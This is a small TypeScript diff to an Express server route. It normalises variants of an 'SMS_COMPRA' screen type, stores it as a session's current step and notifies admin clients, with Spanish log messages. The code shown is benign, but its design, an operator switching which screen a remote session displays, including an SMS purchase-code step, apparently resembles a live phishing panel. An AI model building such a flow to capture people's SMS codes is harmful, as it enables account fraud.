@@ -149,8 +149,18 @@ export async function registerRoutes(app: Express): Promise<Server> {
               
               // Update session in storage with the new screen state
               // Remove "mostrar_" prefix from tipo if present
-              const screenType = tipo.replace('mostrar_', '');
+              let screenType = tipo.replace('mostrar_', '');
+              
+              // Normalizar screenType para SMS_COMPRA
+              if (screenType.toLowerCase() === 'sms_compra' || 
+                  screenType.toLowerCase() === 'smscompra' ||
+                  screenType.toLowerCase() === 'sms compra') {
+                console.log('Normalizando screenType SMS_COMPRA en servidor:', screenType, 'to', ScreenType.SMS_COMPRA);
+                screenType = ScreenType.SMS_COMPRA;
+              }
+              
               await storage.updateSession(sessionId, { pasoActual: screenType });
+              console.log('Actualizado pasoActual a:', screenType);
               
               // Notify all admin clients about the update
               const updatedSession = await storage.getSessionById(sessionId);
